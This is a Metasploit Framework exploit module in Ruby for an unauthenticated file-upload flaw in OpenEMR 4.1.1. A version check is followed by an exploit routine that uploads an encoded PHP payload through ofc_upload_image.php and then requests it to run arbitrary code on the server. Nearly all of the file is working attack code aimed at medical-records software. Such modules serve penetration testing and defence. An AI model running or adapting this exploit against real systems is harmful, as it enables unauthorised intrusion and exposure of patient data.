# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "OpenEMR PHP File Upload Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in OpenEMR 4.1.1 By abusing the
        ofc_upload_image.php file from the openflashchart library, a malicious user can
        upload a file to the tmp-upload-images directory without any authentication, which
        results in arbitrary code execution. The module has been tested successfully on
        OpenEMR 4.1.1 over Ubuntu 10.04.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Gjoko Krstic <gjoko[at]zeroscience.mk>&#039;, # Discovery, PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;90222&#039; ],
          [ &#039;BID&#039;, &#039;37314&#039; ],
          [ &#039;EBD&#039;, &#039;24492&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5126.php&#039; ],
          [ &#039;URL&#039;, &#039;http://www.open-emr.org/wiki/index.php/OpenEMR_Patches&#039; ]
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;OpenEMR 4.1.1&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Feb 13 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to EGallery&#039;, &#039;/openemr&#039;])
        ], self.class)
  end

  def check
    uri = target_uri.path
    peer = "#{rhost}:#{rport}"

    # Check version
    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "interface", "login", "login.php")
    })

    if res and res.code == 200 and res.body =~ /v(\d\.\d\.\d)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Version #{version} detected")

    if version > "4.1.1"
      return Exploit::CheckCode::Safe
    end

    # Check for vulnerable component
    print_status("#{peer} - Trying to detect the vulnerable component")

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri("#{uri}", "library", "openflashchart", "php-ofc-library", "ofc_upload_image.php"),
    })

    if res and res.code == 200 and res.body =~ /Saving your image to/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    uri = target_uri.path

    peer = "#{rhost}:#{rport}"
    payload_name = rand_text_alpha(rand(10) + 5) + &#039;.php&#039;
    my_payload = payload.encoded

    print_status("#{peer} - Sending PHP payload (#{payload_name})")
    res = send_request_raw({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri("#{uri}", "library", "openflashchart", "php-ofc-library", "ofc_upload_image.php") + "?name=#{payload_name}",
      &#039;headers&#039; => { "Content-Length" => my_payload.length.to_s },
      &#039;data&#039;    => my_payload
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200 or res.body !~ /Saving your image to.*#{payload_name}$/
      fail_with(Exploit::Failure::NotVulnerable, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end

    register_file_for_cleanup(payload_name)

    print_status("#{peer} - Executing PHP payload (#{payload_name})")
    # Execute our payload
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri("#{uri}", "library", "openflashchart", "tmp-upload-images", payload_name),
    })

    # If we don&#039;t get a 200 when we request our malicious payload, we suspect
    # we don&#039;t have a shell, either.  Print the status code for debugging purposes.
    if res and res.code != 200
      print_error("#{peer} - Server returned #{res.code.to_s}")
    end
  end

end

